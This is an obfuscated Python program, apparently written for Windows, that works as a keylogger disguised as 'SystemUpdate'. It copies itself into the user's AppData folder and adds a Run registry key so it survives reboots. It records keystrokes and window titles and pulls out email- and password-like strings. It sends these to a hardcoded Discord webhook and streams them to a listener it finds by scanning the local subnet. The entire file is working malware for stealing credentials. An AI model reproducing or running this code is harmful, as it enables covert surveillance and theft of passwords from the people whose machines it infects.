import os,sys,json,socket,threading,ctypes,winreg,shutil,time,re,urllib.request
from datetime import datetime
from pynput import keyboard
_0x1=60000
_0x2="https://discord.com/api/webhooks/1556455324792127488/WHbx4_TO80q9ok2PA_BGZ51gOAfl5WD0iq_DHUcp-ODPzonBlZQaWEUmacFb7IOlskId"
_0x3=None
_0x4=threading.Lock()
_0x5=os.environ.get('LOCALAPPDATA','C:\\')
_0x6=os.path.join(_0x5,"SystemUpdate")
_0x7=os.path.join(_0x6,"SystemUpdate.txt")
_0x8="SystemUpdate.exe"
_0x9=os.path.join(_0x6,_0x8)
if not os.path.exists(_0x6):os.makedirs(_0x6)
def _0xa():
 try:
  _0xb=os.path.abspath(sys.argv[0])
  if os.path.abspath(_0xb)!=os.path.abspath(_0x9):
   if not os.path.exists(_0x9) or os.path.getsize(_0xb)!=os.path.getsize(_0x9):
    shutil.copy2(_0xb,_0x9)
  _0xc=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
  winreg.SetValueEx(_0xc,"WindowsSystemUpdateAutomation",0,winreg.REG_SZ,f'"{_0x9}"')
  winreg.CloseKey(_0xc)
 except:pass
_0xa()
_0xd=[]
_0xe=[]
_0xf=""
def _0x10():
 try:
  _0x11=ctypes.windll.user32.GetForegroundWindow()
  _0x12=ctypes.create_unicode_buffer(512)
  ctypes.windll.user32.GetWindowTextW(_0x11,_0x12,512)
  return _0x12.value if _0x12.value else "Ventana Desconocida"
 except:return "Sistema Windows"
def _0x13():
 global _0x3
 if _0x3 is not None:return True
 try:
  _0x14=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
  _0x14.connect(("8.8.8.8",80))
  _0x15=_0x14.getsockname()[0]
  _0x14.close()
  _0x16=_0x15.split('.')
  _0x17=f"{_0x16[0]}.{_0x16[1]}.{_0x16[2]}."
 except:return False
 def _0x18(_0x19):
  global _0x3
  if _0x3 is not None:return
  try:
   _0x1a=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   _0x1a.settimeout(0.2)
   _0x1a.connect((_0x19,_0x1))
   with _0x4:
    if _0x3 is None:_0x3=_0x1a
    else:_0x1a.close()
  except:pass
 _0x1b=[]
 for _0x1c in range(1,255):
  _0x1d=_0x17+str(_0x1c)
  _0x1e=threading.Thread(target=_0x18,args=(_0x1d,))
  _0x1e.daemon=True
  _0x1b.append(_0x1e)
  _0x1e.start()
 for _0x1e in _0x1b:_0x1e.join(timeout=0.01)
 return _0x3 is not None
def _0x1f():
 global _0x3
 while True:
  if _0x3 is None:_0x13()
  time.sleep(5)
def _0x20(_0x21):
 def _0x22():
  if not _0x2 or "TU_WEBHOOK" in _0x2:return
  _0x23=0
  while _0x23<5:
   try:
    _0x24={"content":_0x21[:1900]}
    _0x25=json.dumps(_0x24).encode('utf-8')
    _0x26=urllib.request.Request(_0x2,data=_0x25,headers={'Content-Type':'application/json','User-Agent':'Mozilla/5.0'})
    with urllib.request.urlopen(_0x26,timeout=10) as _0x27:return
   except:
    _0x23+=1
    time.sleep(10)
 _0x28=threading.Thread(target=_0x22)
 _0x28.daemon=True
 _0x28.start()
def _0x29():
 _0x2a=threading.Thread(target=_0x1f)
 _0x2a.daemon=True
 _0x2a.start()
_0x29()
def _0x2b(_0x2c,_0x2d=False):
 global _0x3
 if not _0x2c:return
 try:
  with open(_0x7,"a",encoding="utf-8") as _0x2e:
   _0x2e.write(_0x2c)
   _0x2e.flush()
 except:pass
 if _0x3:
  try:_0x3.send(_0x2c.encode('utf-8'))
  except:
   with _0x4:
    if _0x3:_0x3.close();_0x3=None
 if _0x2d:_0x20(_0x2c)
def _0x2f(_0x30):
 _0x31=[]
 for _0x32 in _0x30:
  if _0x32=="[BORRAR]":
   if _0x31:_0x31.pop()
  elif _0x32.startswith("[") and _0x32.endswith("]"):pass
  else:_0x31.append(_0x32)
 return "".join(_0x31)
def _0x33(_0x34):
 _0x35=re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9_\$@#%!&*=-]{4,}',_0x34)
 return " | ".join(_0x35) if _0x35 else "No se detectaron cadenas continuas"
def _0x36():
 global _0xd,_0xe,_0xf
 _0x37=_0x2f(_0xd)
 _0x38=_0x2f(_0xe+_0xd)
 if _0x38.strip():
  _0x39=_0x33(_0x38)
  _0x3a=(f"\n\n========================================\n"
   f"REPORTE DE ENTRADA DE DATOS\n"
   f"Origen: {_0xf}\n"
   f"Texto Completo: {_0x38}\n"
   f"Filtro Continuo: {_0x39}\n"
   f"========================================")
  _0x2b(_0x3a,_0x2d=True)
 _0xd=[]
 _0xe=[]
def _0x3b(_0x3c):
 global _0xd,_0xe,_0xf
 _0x3d=_0x10()
 if _0x3d!=_0xf:
  if _0xf!="":_0x36()
  _0x3e=datetime.now().strftime('%H:%M:%S')
  _0x3f=f"\n\nENTORNO: {_0x3d} ({_0x3e})\n-> "
  _0x2b(_0x3f)
  _0xf=_0x3d
 try:
  if _0x3c.char is not None:
   _0xd.append(_0x3c.char)
   _0x2b(_0x3c.char)
 except AttributeError:
  if _0x3c==keyboard.Key.space:
   _0xd.append(" ")
   _0x2b(" ")
  elif _0x3c==keyboard.Key.enter:
   _0xd.append(" [ENTER] ")
   _0x36()
   _0x2b(f" -> ")
  elif _0x3c==keyboard.Key.tab:
   _0xd.append(" [TAB] ")
   _0x40=_0x2f(_0xd)
   _0xe.extend(list(_0x40)+[" "])
   _0xd=[]
   _0x2b(" [TAB] ")
  elif _0x3c==keyboard.Key.backspace:
   _0xd.append("[BORRAR]")
  elif _0x3c in[keyboard.Key.shift,keyboard.Key.shift_r,keyboard.Key.caps_lock,keyboard.Key.ctrl,keyboard.Key.ctrl_l,keyboard.Key.ctrl_r,keyboard.Key.alt,keyboard.Key.alt_l,keyboard.Key.alt_r,keyboard.Key.alt_gr]:pass
  else:
   _0x41=f" [{_0x3c.name}] "
   _0xd.append(_0x41)
   _0x2b(_0x41)
def _0x42():
 with keyboard.Listener(on_press=_0x3b) as _0x43:_0x43.join()
_0x42()





